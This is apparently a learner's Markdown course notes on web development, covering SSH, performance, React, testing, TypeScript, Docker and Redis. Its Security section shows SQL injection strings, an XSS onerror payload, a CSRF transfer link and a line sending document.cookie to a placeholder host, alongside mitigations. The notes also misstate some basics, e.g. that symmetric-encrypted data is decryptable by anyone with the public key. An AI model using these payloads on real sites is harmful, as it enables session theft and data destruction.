# Summary of

The Complete Junior to Senior Web Developer Roadmap by Andrei Neagoie

<details open="open">
  <summary>Table of Contents</summary>
  <ul>
    <li><a href="#section-2-ssh">Section 2: SSH</a></li>
    <li><a href="#section-3-performance-part-1">Section 3: Performance Part 1</a></li>
    <li><a href="#section-4-react-redux-module-bundling">Section 4: React + Redux + Module Bundling</a></li>
    <li><a href="#section-5-performance-part-2">Section 5: Performance Part 2</a></li>
    <li><a href="#section-6-testing">Section 6: Testing</a></li>
    <li><a href="#section-7-typescript">Section 7: TypeScript</a></li>
    <li><a href="#section-8-spa-vs-server-side-rendering">Section 8: SPA vs Server Side Rendering</a></li>
    <li><a href="#section-9-security">Section 9: Security</a></li>
    <li><a href="#section-10-code-analysis">Section 10: Code Analysis</a></li>
    <li><a href="#section-11-docker">Section 11: Docker</a></li>
    <li><a href="#section-12-redis">Section 12: Redis</a></li>
    <li><a href="#section-13-session-jwt">Section 13: Sessions + JWT</a></li>
  </ul>
</details>

# Details

## Section 2: SSH

<details open>
  <summary>Click to Contract/Expend</summary>

### 9. SSH Command

`ssh {user}@{host}`

### 15. How SSH Works

- Symmetrical Encryption
- Asymmetrical Encryption
- Hashing

### 16. Symmetric Encryption

Anyone who has the public key can decrypt the data.

Therefore, there is Key Exchange Algorithms. -> Asymmetrical Encryption

### 17. Asymmetric Encryption

One of the most popular algorithm is Diffie Hellman Key Exchange

- [Youtube - Secret Key Exchange (Diffie-Hellman) - Computerphile](https://www.youtube.com/watch?v=NmM9HA2MQGI)
- [Youtube - Diffie Hellman -the Mathematics bit- Computerphile](https://www.youtube.com/watch?v=Yjrfm_oRO0w)
- [Youtube - Key Exchange Problems - Computerphile](https://www.youtube.com/watch?v=vsXMMT2CqqE)
- [Youtube - Elliptic Curves - Computerphile](https://www.youtube.com/watch?v=NF1pwjL9-DE)

### 21. SSH Into A Server

```sh
# generate ssh key
ssh-keygen -C "test@gmail.com"
Enter file in which to save the key (/Users/noah/.ssh/id_rsa): /Users/noah/.ssh/id_rsa_digitalocean
Enter passphrase (empty for no passphrase): [Enter for empty]

# copy pubic key to clipboard
pbcopy < ~/.ssh/id_rsa_digitalocean.pub

# ssh to digital ocean and paste my public key in autorized_keys
ssh {user}@{host}
cd ~/.ssh
nano authorized_keys

# still permission denied when ssh connect
# Add ssh
ssh-add ~/.ssh/id_rsa_digitalocean
```

### 26. Solution: Set Up SSH on Github

```sh
# generate ssh key
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
pbcopy < ~/.ssh/id_rsa_digitalocean2.pub

ssh-add -l  # list
ssh-add -D  # remove all
```

```sh
# connect to raspberry pie or something
ssh -tt pi@10.2.1.12 ssh -tt pi@10.2.3. .....
```

</details>

## Section 3: Performance Part 1

<details open>
  <summary>Click to Contract/Expend</summary>

### 33. 3 Keys To Performance

![3 Keys To Performance](resources/performance.jpg '3 Keys To Performance')

### 34. Network Performance

1. Minimize Text
   - HTML, CSS, and JS
   - [Uglify JS - online](https://skalman.github.io/UglifyJS-online/)
2. Minimize Images
   - JPG : quality, colourful images
   - GIF : fewer colors, animation
   - PNG : transparency
   - SVG : vector, simple icons, logos, and illustrations

### 36. Resources: Image File Formats

- [Image File formats - 99 designs](https://99designs.com.au/blog/tips/image-file-types/)
- [See How Images Affect Your Page Speed - imgix](https://pageweight.imgix.com/)
- [GIF, PNG, JPG or SVG. Which One To Use? - sitepoint](https://www.sitepoint.com/gif-png-jpg-which-one-to-use/)

### 37. Image Optimizations

- Reduce PNG with TinyPNG
  - [TynyPNG](https://tinypng.com/)
- Reduce JPG with JPEG-optimizer
  - [JPEG-optimizer](http://jpeg-optimizer.com/)
- Try to choose simple illustrations over highly detailed photographs
- Always lower JPEG image quality (30-60%)
  - When saved
- Resize image based on size it will be displayed
- display different sized images for different backgrounds.
  - Like CSS Media query or HTML
- Use CDN like imigx
  - [imgIX](https://imgix.com/)
  - It will give us optimized size of images
- Remove image metadata
  - [VIEW AND REMOVE EXIF](https://www.verexif.com/en/)
  - 140k -> 137k

### 39. Exercise: #1 - Media Queries

[CSS Media Queries Cheat Sheet](https://gist.github.com/bartholomej/8415655)

## 43. Solution: #2 - Network Optimizations

1. Minimize all text
2. Minimize images
3. Media Queries
4. Minimize # of files
5. Combine all JS files into one JS file - webpack
6. Combine all CSS files into one CSS file - webpack

### 44. Critical Render Path Introduction

1. DOM : Document Object Model
2. CSSOM : CSS Object Model
3. (DOMContentLoaded) Render Tree
4. Layout
5. Paint (Load)

```js
// 2nd
document.addEventListener('DOMContentLoaded', function (event) {
  console.log('DOM fully loaded and parsed');
});
// 3rd
window.addEventListener('load', function (event) {
  console.log('All resources finished loading!');
});
// 1st
console.log('this is script 1');
```

### 46. Critical Render Path 2

```
HTML
  #1 Load <style> in <head>
  #2 Load <script> right before /body
CSS
  #3 Load only what is needed
  #4 Above the fold loading
  #5 Media attributes
  #6 Less specificity
JS
  #7 Load scripts asynchronously
  #8 Defer loading of scripts
  #9 Minimize DOM manipulation
  #10 Avoid long running Javascript
```

### 51. Exercise: #4 - Keiko Corp Website

Page Test Online Tools

- [PageSpeed Insights](https://developers.google.com/speed/pagespeed/insights)
- [WebPageTest](https://www.webpagetest.org/)
- [Lighthouse - Chrome Extension](https://developers.google.com/web/tools/lighthouse)

### 52. Resources: Keiko Corp Website

- git@github.com:aneagoie/keiko-corp.git
- https://aneagoie.github.io/keiko-corp/

### 53. Solution: Keiko Corp Website

jQuery -> Vanila Javascript

[You Might Not Need jQuery](http://youmightnotneedjquery.com/)

### 54. Optional: Resource Prefetching

[Article - Prefetching, preloading, prebrowsing](https://css-tricks.com/prefetching-preloading-prebrowsing/)

### 55. Resources: Performance Tools

Here are some extra resources and guides if you want a little more practice:

#### Exercise: Dev Tools:

1. [View main thread activities in a table](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#activities) to sort activities based on which ones took up the most time.
2. [Analyze frames per second (FPS)](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#fps) to measure whether your animations truly run smoothly.
3. [Monitor CPU usage, JS heap size, DOM nodes, layouts per second, and more](https://developer.chrome.com/blog/new-in-devtools-64/#perf-monitor) in real-time with the Performance Monitor.
4. [Capture screenshots while recording](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#screenshots) to play back exactly how the page looked while the page loaded, or an animation fired, and so on.
5. [View interactions](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#interactions) to quickly identify what happened on a page after a user interacted with it.
6. [Find scroll performance issues in real-time](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#scrolling-performance-issues) by highlighting the page whenever a potentially problematic listener fires.
7. [View paint events in real-time](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#paint-flashing) to identify costly paint events that may be harming the performance of your animations. \
   [View main thread activity](https://developer.chrome.com/docs/devtools/evaluate-performance/reference/#main) to view every event that occurred on the main thread while you were recording.

#### Other Resources:

- http://optimizilla.com/
- https://tools.pingdom.com/
- https://www.thinkwithgoogle.com/feature/mobile/
- https://developers.google.com/web/tools/lighthouse/
- http://websitespeedranker.com/
- https://pageweight.imgix.com/
- https://developers.google.com/speed/pagespeed/insights/
- https://passmarked.com/
- https://images.guide/
- https://www.crazyegg.com/blog/image-editing-tools/

#### Additional image manipulation tools:

- [XNConvert](https://www.xnview.com/en/xnconvert/): This free, cross-platform tool can handle batched images, and performs resizing, optimization, and other transforms.
- [ImageOptim](https://imageoptim.com/mac): This free tool is available for Mac and as an online service, and is specifically aimed at optimizing images for speed, including metadata removal (discussed above).
- [PicResize](https://picresize.com/): One of several good browser-based tools that gives you lots of options for cropping, rotating, resizing, adding effects to, and converting images.
- [Gimp](https://www.gimp.org/): This ever-popular cross-platform tool just gets better with age. Powerful and flexible, Gimp lets you perform a wide variety of image manipulation tasks including, of course, resizing.

### 56. HTTP/2

[Introduction to HTTP/2](https://developers.google.com/web/fundamentals/performance/http2/)

### 58. HTTP/3

[HTTP/3: the past, the present, and the future](https://blog.cloudflare.com/http3-the-past-present-and-future/)

</details>

## Section 4: React Redux Module Bundling

<details open>
  <summary>Click to Contract/Expend</summary>

### 62. Updated Code For This Section

https://github.com/aneagoie/robofriends

https://github.com/aneagoie/robofriends-redux

### 69. CWD: create-react-app 2

[Create React App](https://create-react-app.dev/docs/getting-started)\
[React Documents](https://reactjs.org/docs/getting-started.html)

### 75. CWD: Your First React Component

[Tachyons : Light CSS Library](https://tachyons.io/)

`npm install tachyons`

### 82. CWD: Building A React App 4

- Smart Component (with state)
- Pure Component

### 83. CWD: Building A React App 5

```css
div {
  overflow: scroll;
}
```

### 84. CWD: Building A React App 6

- Containers : Smart components (it can be pages?)
- Components : Pure components

### 86. CWD: Keeping Your Projects Up To Date

[npm update (^ Caret and ~ Tilde)](https://docs.npmjs.com/cli/v7/commands/npm-update)

### 91. CWD: Deploying Our React App

[Create React App - Deployment Github Pages](https://create-react-app.dev/docs/deployment/#github-pages)

- On Page, I can change which branch I would like to deploy
- On Repository Settings, I can set up website url

### 98. CWD: React Hooks 7

```html
<!-- type search, "ESC" key can remove the input text -->
<input type="search" />
```

### 105. Installing Redux

```sh
npm install redux react-redux --save
```

### 106. Redux Toolkit

[Redux Toolkit](https://redux-toolkit.js.org/) helps reducing time with boilerplate

### 110. Redux Middleware

```sh
npm install redux-logger --save-dev
```

- [redux-logger options](https://github.com/LogRocket/redux-logger#log-everything-except-actions-with-certain-type)
- [redux-logger exclude action.type](https://stackoverflow.com/questions/44572341/filtering-redux-form-actions-in-redux-logger-with-predicate-option)

[Redux DevTools chrome extension](https://chrome.google.com/webstore/detail/redux-devtools/lmhkpmbekcpmknklioeibfkpmmfibljd?hl=en)

### 110. Redux Middleware

```sh
npm install redux-thunk --save
```

### 114. Popular Tools For React + Redux

Functional

- [Ramda](https://ramdajs.com/)
- [Lodash\_](https://lodash.com/)

CSS

- [glamorous](https://glamorous.rocks/)
- [styled component](https://www.styled-components.com/)
- [css-modules](https://github.com/css-modules/css-modules)

- [Gatsby](https://www.gatsbyjs.com/)
- [NextJs](https://nextjs.org/)

CSS component

- [material-ui](https://material-ui.com/)
- [Semantic UI](https://react.semantic-ui.com/)

Others

- \*\*\*\*[reselect](https://github.com/reduxjs/reselect)
- [Redix-Saga](https://redux-saga.js.org/)
- [Immutable](https://immutable-js.com/)

### 115. Module Bundlers

- [Parcel](https://parceljs.org/) - Simple; Less configuration
- [Webpack](https://webpack.js.org/)
- [Rollup.js](https://rollupjs.org/guide/en/) - Remove unnecessary part

### 118. Webpack

[Babel](https://babeljs.io/)

```sh
npm install --save-dev webpack webpack-cli webpack-dev-server
npm install --save-dev @babel/core @babel/preset-env @babel/preset-react babel-loader
npm install --save react react-dom
```

[ESLint](https://eslint.org/)

```sh
npm install --save-dev eslint eslint-loader
```

[@babel/eslint-parser](https://github.com/babel/babel/tree/main/eslint/babel-eslint-parser)

```sh
npm install --save-dev @babel/eslint-parser
```

```sh
npm install --save-dev eslint-config-airbnb eslint-plugin-import eslint-plugin-react eslint-plugin-react-hooks eslint-plugin-jsx-a11y

```

### 121. Resources: Webpack Configurator

[Webpack Configurator](https://createapp.dev/webpack)

### 122. Parcel

```sh
mkdir parcel-project
cd parcel-project
npm install --save react react-dom
npm init -y

npm install --save-dev parcel-bundler
npm install --save-dev @babel/preset-env @babel/preset-react

# "start" : "parcel index.html"
npm start
```

no configuration and easy to use.\
It is great bundler when you create a simple project or configuration time is wasting for a project

</details>

## Section 5: Performance Part 2

<details open>
  <summary>Click to Contract/Expend</summary>

### 127. Optimizing Code

1. Chrome DevTool - Performance Tab
2. [Webpage Test](https://www.webpagetest.org/)

Image loading, Javascript, Etc.

### 130. Code Splitting Part 1

the bundle.js is currently 81k

### 131. ES2020: Dynamic import()

[Exploring ES2020 features - Dynamic Import](https://www.ksharifbd.com/blog/exploring-ES2020-dynamic-import/#Import)

```js
// https://www.ksharifbd.com/blog/exploring-ES2020-dynamic-import/#Import
// by Md. Kamal Sharif
<body>
  <form>
    <div>
      <input type="radio" id="add" value="add" name="operation">Add </input>
    </div>

    <div>
      <input type="radio" id="subtract" value="subtract" name="operation">Subtract</input>
    </div>

    <p>The operation is <span id="selectedOperation"></span> and the result is: <span id="result"></span></p>
  </form>

  <script>
    const addInput = document.getElementById('add');
    const subtractInput = document.getElementById('subtract');
    const selectedOperationEl = document.getElementById('selectedOperation');
    const resultEl = document.getElementById('result');

    const handleChange = event => {
      const { value } = event.target;

      selectedOperationEl.innerText = value.toUpperCase();

      import(`./${value}.js`) // using template literal
        .then(module => {
          resultEl.innerText = module.default(7, 4);
        })
        .catch(error => console.error(error));
    };

    addInput.addEventListener('click', handleChange);
    subtractInput.addEventListener('click', handleChange);
  </script>
</body>
```

### 137. React Performance Optimizations

The lecture shows http://localhost:3000/?react_perf and user timing on performance tab on chrom dev tool but it is a bit old.

React DevTool -> Components -> Settings -> General -> Highlight updates when components render

[React Optimizing Performance](https://reactjs.org/docs/optimizing-performance.html#profiling-components-with-the-chrome-performance-tab)

[React DevTool - React Profiler](https://reactjs.org/blog/2018/09/10/introducing-the-react-profiler.html)

### 139. React Performance Optimizations 2

[React.memo() vs. useMemo(): Major differences and use cases
](https://blog.logrocket.com/react-memo-vs-usememo/)

[why-did-you-render - Analysing tool for rendering](https://github.com/welldone-software/why-did-you-render)
[npm why-did-you-render - Analysing tool for rendering](https://www.npmjs.com/package/@welldone-software/why-did-you-render)

```sh
npm install @welldone-software/why-did-you-render --save-dev
```

> It needs to change babel option a little bit, so I didn't go further here.

### 142. Resources: Tree Shaking 101

[Reduce JavaScript Payloads with Tree Shaking](https://developers.google.com/web/fundamentals/performance/optimizing-javascript/tree-shaking/)

### 143. Progressive Web Apps

1. HTTPS
2. Manifest
3. Service Worker - works like proxy; Web API: Cache API

### 144. Resources: Progressive Web Apps

[Submitting PWA to 3 app stores](http://debuggerdotbreak.judahgabriel.com/2018/04/13/i-built-a-pwa-and-published-it-in-3-app-stores-heres-what-i-learned/)

[Progressive Web Apps on iOS](https://medium.com/@firt/progressive-web-apps-on-ios-are-here-d00430dee3a7)

### 145. Progressive Web Apps Examples

[Pokedex.org](https://pokedex.org/)

### 146. PWA - HTTPS

[PWA Checklist](https://web.dev/pwa-checklist/)

[PWA Checklist for Google store](https://sami-chkhachkhi.medium.com/pwa-checklist-for-the-googl-341cb0426e)

[PWA Checklist & Best Practices](https://asperbrothers.com/blog/pwa-2019-best-practices-checklist/)

[Let's Encrypt](https://letsencrypt.org/)

[Cloudflare](https://www.cloudflare.com/)

### 148. PWA - App Manifest

[Viewport Meta Tag](https://web.dev/viewport/)

[Favicon Generator](https://realfavicongenerator.net/)

### 151. Resources: PWA - Service Workers

[isServiceWorkerReady?](https://jakearchibald.github.io/isserviceworkerready/)

[push notifications implementation](https://auth0.com/blog/introduction-to-progressive-web-apps-push-notifications-part-3/)

### 155. Deploying Our React App

I have used the other deployed project, for PWA\

https://pcsmomo.github.io/monsters-rolodex

### 159. Solution Files - PWA

[Progressive Tooling](https://progressivetooling.com/)

</details>

## Section 6: Testing

<details open>
  <summary>Click to Contract/Expend</summary>

### 175. Asynchronous Tests

fetch() works on browser as it is under window object\
but in node, we need install a similar library

```
npm install --save-dev node-fetch
```

### 176. Asynchronous Tests 2

[Jest Cheat Sheet](https://github.com/sapegin/jest-cheat-sheet)

### 182. Introduction To Enzyme

- **shallow** renders only the component excluding child components\
  -> It is good to test only one component
- **mount** does a full render, whole DOM
- **render** is kind of between shallow and mount. It doesn't render child

> [Enzyme render diffs](https://gist.github.com/fokusferit/e4558d384e4e9cab95d04e5f35d4f9130)\
> So my rule of thumbs is:
>
> - Always begin with shallow (As of Enzyme v3 shallow API does call React lifecycle methods)
> - If you want to test component lifecycle and children behavior, use mount
> - If you want to test children rendering with less overhead than mount and you are not interested in lifecycle methods, use render

### 185. Snapshot Testing

```sh
npm test -- --coverage
```

### 191. Testing Connected Components

App.js was complicated as it has connect() and also render all components.\
So, we separate it to MainPage to only render components

### 194. Testing Reducers

> Reducers in this project are comparably easy to test as they are pure functions.

### 195. Testing Actions

```sh
npm install --save-dev redux-mock-store
```

```sh
npm install --save-dev nock
```

</details>

## Section 7: TypeScript

<details open>
  <summary>Click to Contract/Expend</summary>

### 204. Static Typing In Javascript

Static Typing Tools

- Flow (Babel) : Babel removes and translates
- Typescript (Compiler) : Superset of javascript, typescript is trying to go with javascript
- Elm (Compiler) : Different own language
- Reasonml (Compiler) : Different language, facebook

### 205. TypeScript Compiler

```sh
sudo npm install -g typescript

tsc
```

### 208. TypeScript

Typescript Compile

```sh
tsc typescript.ts
# it generates typescript.js
```

### 210. TypeScript 2

Typescript Init and Watch mode

```sh
tsc --init
tsc typescript.ts --watch
```

### 215. TypeScript 6

[Type vs Interface : Stackoverflow](https://stackoverflow.com/questions/37233735/typescript-interfaces-vs-types)
[Type vs Interface : Typescript DOC](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#differences-between-type-aliases-and-interfaces)

### 222. DefinitelyTyped

Website for Standard Types
[Definitely Typed](https://definitelytyped.org/)

### 224. Exercise: #1 - TypeScript In Robofriends

[robofriends-typescript start repo](https://github.com/aneagoie/robofriends-typescript)

### 226. Solution: #1 - TypeScript In Robofriends

[How to use Definitely Typed : Interface HTMLElement](http://definitelytyped.org/docs/flipsnap--flipsnap/interfaces/htmlelement.html)

</details>

## Section 8: SPA vs Server Side Rendering

<details open>
  <summary>Click to Contract/Expend</summary>

### 231. Section Overview

[The Very First Website : info.cern.ch](http://info.cern.ch/)

### 232. CSR vs SSR

- CSR : Client Side Rendering
  - Initial loading is heavier
- SSR : Server Side Rendering
  - Every Page request is heavier

### 233. Server Side Rendering React

- Client Side
  - ReactDOM.hydrate()
- Server Side
  - ReactDOMServer.renderToNodeStream()
  - ReactDOMServer.renderToString()

### 233. Server Side Rendering React

Server side rendering React would be something like this,

08-server-side-rendering/server.js

But SSR in React can get quite complicated and messy. Next.js would be a better option.

### 235. CSR vs SSR Part 2

1. CSR
   - Pros
     - Rich Interactions
     - Faster Response
     - Web Applications
   - Cons
     - Low SEO Potential
     - Longer Initial Load
2. SSR
   - Pros
     - Static Sites
     - SEO
     - Initial Page Load
   - Cons
     - Full Page Reloads
     - Slower Page Rendering (Requests to server)

### 237. Static vs SSR vs CSR: Gatsby.js vs Next.js vs React.js

Where do you want the work to happen?

1. Client
2. Server
3. Developer
4.

### 239. Setting Up Next.js

```sh
mkdir next-ssr
cd next-ssr
npm init -y
npm install next react react-dom --save
```

### 241. Client Side Routing

```js
import Link from 'next/link';
```

### 244. Dynamic Apps with Next.js

```sh
npm install --save isomorphic-unfetch
```

```js
Robots.getInitialProps = async function () {
  const res = await fetch('https://jsonplaceholder.typicode.com/users');
  const data = await res.json();

  // Initial refresh : console.log on server
  // Revisiting the page : console.log on client
  console.log(data);
  return {
    robots: data
  };
};
```

### 245. Exercise: #2 - Updated Next.js Features

1. It's recommended to use _getStaticProps_ or _getServerSideProps_ for data fetching now instead of _getInitialProps_: \
   https://nextjs.org/docs/api-reference/data-fetching/getInitialProps
2. We no longer need to import isomorphic-unfetch. So update the code by removing it: \
   https://nextjs.org/blog/next-9-4#improved-built-in-fetch-support

### 246. Deploying Next.js Apps

Andrei mentioned _now_ but that package is deprecated \

> "now" is deprecated and will stop receiving updates on December 31, 2020. Please use "vercel" instead.

[Vercel](https://vercel.com/docs#)

I should try vercel and serverless for CD

### 249. Understand JavaScript SEO

[Understand the JavaScript SEO basics](https://developers.google.com/search/docs/advanced/javascript/javascript-seo-basics)

[16 Ways to Search, Find and Edit with Chrome DevTools](https://www.telerik.com/blogs/16-ways-to-search-find-and-edit-with-chrome-devtools)

</details>

## Section 9: Security

<details open>
  <summary>Click to Contract/Expend</summary>

### 253. Star Of Security

1. Injections
2. 3rd Party Library
3. Logging
4. HTTPS Everywhere
5. XSS & CSRF
6. Code Secret
7. Secure Headers
8. Access Control
9. Data Management
10. Don't Trust Anyone
11. Authentication

### 254. Injections

[PSequel : PostgresSQL GUI for Mac](http://www.psequel.com/)

1. SQL Injection

```sql
INSERT INTO sqlinjection (email) VALUE ('lol');

-- Drop Table
INSERT INTO sqlinjection (email) VALUE (; DROP TABLE users; --);
INSERT INTO sqlinjection (email) VALUE (; DROP TABLE sqlinjection; --);

-- Ignoring password
-- ' or 1=1--
WHERE password = 'password' or 1=1;
```

2. Script Injection

```js
// Input this script in a input field
<img src="/wrong-path" onerror="alert('boom');" />;

// Bad
p.innerHTML = input;
// Better
const textnode = document.createTextNode(input);
p.appendChild(textnode);
```

[SQL Injection Exercise](https://www.hacksplaining.com/exercises/sql-injection)

#### Solution

1. Sanitize Input
   - White list and Black list
2. Parametrize Querys
   - Object relational mappers
3. [Knex.js - A SQL Query Builder for Javascript](https://knexjs.org/)

### 258. 3rd Party Libraries

```sh
npm install -g nsp
nsp check # audit package.json

npm install -g snyk
snyk test # audit node_modules directory
```

### 260. Logging

> There is no perfect answer for logging

For Node

1. [morgan](https://www.npmjs.com/package/morgan)
   ```sh
   npm install morgan
   ```
2. [winston - it's like console.log(), good for production](https://www.npmjs.com/package/winston)
   ```sh
   npm install winston
   ```

> Sensetive information should not go to the front end, as it can be hacked.

### 261. HTTPS Everywhere

- [Let's Encrypt](https://letsencrypt.org/)
- [Cloudflare](https://www.cloudflare.com/)

> Wow.. this website is recommended by so many instructors

### 262. XSS + CSRF

- XSS : Cross Site Scripting

```js
// popular XSS
window.location = 'haxxed.com?cookie=' + document.cookie;
```

- CSRF : Cross Site Request Forgery

For example, many scam emails

```html
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more!</a>
```

It can be prevented by CSP (Content Security Policy)

#### Solutions

1. Sanitize Input
2. No eval()
3. No document.write()
   ```js
   document.write('<script>alert(1)</script>');
   ```
4. CSP : Content Security Policy
   ```js
   // Node
   res.set({
     'Content-Security-Policy': "script-src 'self' https://apis.google.com"
   });
   ```
   ```html
   <meta
     http-equiv="Content-Security-Policy"
     content="default-src 'self'; img-src https://*; child-src 'none';"
   />
   ```
5. Secure + HTTPOnly Cookies
   ```js
   res.cookie('session', '1', { httpOnly: true });
   res.cookie('session', '1', { secure: true });
   ```

[npm csurf - Node.js CSRF protection middleware](https://www.npmjs.com/package/csurf)

### 263. Exercise: #3 - XSS + CSRF

- [XSS Exercise](https://www.hacksplaining.com/exercises/xss-stored#/loafing-about)
- [CSRF Exercise](https://www.hacksplaining.com/exercises/csrf#/start)

### 264. Resources: XSS + CSRF

- [CSP : Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

### 265. Code Secrets

1. Environmental Variables
   - If use Create React App
   ```js
   process.env.NODE_ENV;
   ```
   ```sh
   # .env
   REACT_APP_SAY_HI = HIII
   ```
   - If not using Create React App, install [dotenv](https://www.npmjs.com/package/dotenv)
     ```sh
     npm insetall dotenv --save
     ```
2. Commit History
   - Do not write secret data to commit

### 266. Secure Headers

- [npm helmet](https://www.npmjs.com/package/helmet)
- [helpmet gihub](https://github.com/helmetjs/helmet)

Helmet helps you secure your Express apps by setting various HTTP headers. It's not a silver bullet, but it can help!

### 267. Resources: Secure Headers

Articles to read about HTTP

- [HTTP: The Protocol Every Web Developer Must Know - Part 1](https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177)
- [HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [HTTP - Header Fields](https://www.tutorialspoint.com/http/http_header_fields.htm)

### 268. Access Control

Principal of least privilege

for example CORS, limiting access origins

### 269. Data Management

1. Hashing password : bcrypt, scrypt, Aragon2
   - `npm bcrypt`
   ```js
   // To hash a password
   bcrypt.hash(myPlaintextPassword, saltRounds, function (err, hash) {
     // Store hash in your password DB.
   });
   // To Check a password
   bcrypt.compare(myPlaintextPassword, hash, function (err, result) {
     // result == true
   });
   ```
   > bscrypt responses a little late to slow down bad actors attempt
2. Encrypt : pgcrypto - encrypt a few columns for posgres SQL

### 271. Don’t Trust Anyone

To prevent DDOS(Distributed Denial of Service) attack
[npm ratelimiter - Rate limiter for Node.js backed by Redis](https://www.npmjs.com/package/ratelimiter)

### 273. Exercise: #4 - Optional Hacking

To learn about hacking - [HACKSPLAINING](https://www.hacksplaining.com/lessons)

### 274. Resources: Personal Security

[What Your Hace](https://watchyourhack.com/)

### 275. Section Summary

[OWASP Top 10 - Latest Security Features](https://owasp.org/Top10/)

</details>

## Section 10: Code Analysis

<details open>
  <summary>Click to Contract/Expend</summary>

### 280. Setting Up Your Environment

npm extra pakcages

1. smart-brain-api
   - [clarifai - machine learning, AI](https://www.clarifai.com/)
   - [knex : A SQL Query Builder for Javascript](https://knexjs.org/)
   - pg : postgreSQL
2. smart-brain
   - [react-particles-js - Particle Background](https://github.com/Wufe/react-particles-js)
   - [react-tilt - Hover for Logo](https://www.npmjs.com/package/react-tilt)

```sh
# Start postgresql and create the db
brew services start postgresql
createdb 'smart-brain'
```

```sql
-- create tables
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100),
  email TEXT UNIQUE NOT NULL,
  entries BIGINT DEFAULT 0,
  joined TIMESTAMP NOT NULL
);

CREATE TABLE login (
  id SERIAL PRIMARY KEY,
  hash VARCHAR(100) NOT NULL,
  email TEXT UNIQUE NOT NULL
);
```

```sh
# connect db with dbeaver (works) / PSequel (didn't work for me)

# or connect in console
psql postgres://@localhost:5432/smart-brain
# display table
\d
```

### 282. Optional: CWD - Installing PostgreSQL

```sh
brew update
brew doctor
brew install postgresql
brew services start postgresql
createdb 'test'
# Connect to 'test'
psql 'test'
brew services stop postgresql
```

### 283. How To Analyze Code

> When people look at code first, many start criticise the code,\
> But we don't know what was the situation for example, requirements changing, training junior developer or time schedule.\
> So it is important to be neutral to work all together.

</details>

## Section 11: Docker

<details open>
  <summary>Click to Contract/Expend</summary>

### 296. Dockerfile

```sh
# Build the image
docker build -t superawesomecontainer .

# Get into container
docker run -it superawesomecontainer
# root@cf26f0348afc:/usr/src/app#
```

### 298. Docker Commands

```sh
docker run -d superawesomecontainer
docker ps
docker exec -it [CONTAINER ID] bash
docker stop [CONTAINER ID]
```

### 299. Dockerfile 2

```sh
docker build -t superawesomecontainer .
docker run -it superawesomecontainer
npm start
# localhost:3000 -> Cannot connect

docker run -it -p 3000:3000 superawesomecontainer
# localhost:3000 -> Working

# After changing any file, I need to re build the container
docker build -t superawesomecontainer .
docker run -it -p 3000:3000 superawesomecontainer
```

### 300. Exercise: #1 - Your First Docker Container

[Docker Usage](https://docs.docker.com/engine/reference/builder/#usage)

### 302. Docker Compose

```sh
docker-compose build
docker-compose run smart-brain-api
# After changing docker-compose.yml, rebuild
docker-compose build
docker-compose run smart-brain-api
```

```sh
# Add logging
npm install --save morgan
# and change server.js
```

```sh
docker-compose down

# docker-compose build
# docker-compose run smart-brain-api
docker-compose up --build
```

### 303. Resources: Docker Compose Commands

- [docker-compose build](https://docs.docker.com/compose/reference/build/)
- [docker-compose run](https://docs.docker.com/compose/reference/run/)
- [docker-compose up](https://docs.docker.com/compose/reference/up/)

### 305. Resources: Docker Volumes

- [What is the purpose of VOLUME in Dockerfile](https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile)
- [Docker Volumes and Networks with Compose](https://www.linux.com/topic/cloud/docker-volumes-and-networks-compose/)

### 306. Docker Compose 3

```sh
docker-compose up -d
docker-compose exec smart-brain-api bash
```

### 307. Docker Compose 4 : Add PostgreSQL

```sh
docker-compose up --build
```

</details>

## Section 12: Redis

<details open>
  <summary>Click to Contract/Expend</summary>

### 318. Section Overview

Redis : NoSQL in-memory database

Classification of NoSQL Databases

- Key-Value : Redis
- Document : MongoDB, CouchDB
- Wide Column : cassadra
- Graph : neo4j
</details>

## Section 12: Redis

<details open>
  <summary>Click to Contract/Expend</summary>

### 318. Section Overview

Redis is in-memory key-value db and extremely fast.\
But it could lose data for the last a few minutes or something.

### 321. Installing Redis

[Redis - download and install](https://redis.io/download)

```sh
$ tar xzf redis-6.2.5.tar.gz
$ cd redis-6.2.5
$ make
$ make test # So long....
```

````sh
# 1. Run server
$ src/redis-server
# 98782:C 16 Sep 2021 08:01:59.042 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
# 98782:C 16 Sep 2021 08:01:59.042 # Redis version=6.2.5, bits=64, commit=00000000, modified=0, pid=98782, just started
# 98782:C 16 Sep 2021 08:01:59.042 # Warning: no config file specified, using the default config. In order to specify a config file use src/redis-server /path/to/redis.conf
# 98782:M 16 Sep 2021 08:01:59.043 * Increased maximum number of open files to 10032 (it was originally set to 256).
# 98782:M 16 Sep 2021 08:01:59.043 * monotonic clock: POSIX clock_gettime
#                 _._
#            _.-``__ ''-._
#       _.-``    `.  `_.  ''-._           Redis 6.2.5 (00000000/0) 64 bit
#   .-`` .-```.  ```\/    _.,_ ''-._
#  (    '      ,       .-`  | `,    )     Running in standalone mode
#  |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379
#  |    `-._   `._    /     _.-'    |     PID: 98782
#   `-._    `-._  `-./  _.-'    _.-'
#  |`-._`-._    `-.__.-'    _.-'_.-'|
#  |    `-._`-._        _.-'_.-'    |           https://redis.io
#   `-._    `-._`-.__.-'_.-'    _.-'
#  |`-._`-._    `-.__.-'    _.-'_.-'|
#  |    `-._`-._        _.-'_.-'    |
#   `-._    `-._`-.__.-'_.-'    _.-'
#       `-._    `-.__.-'    _.-'
#           `-._        _.-'
#               `-.__.-'

# 2. Connect to cli
$ src/redis-cli
# 127.0.0.1:6379 >
````

### 323. Redis Commands

[Redis Commands](https://redis.io/commands)

```sql

SET name "Godzilla"
GET name
EXISTS name
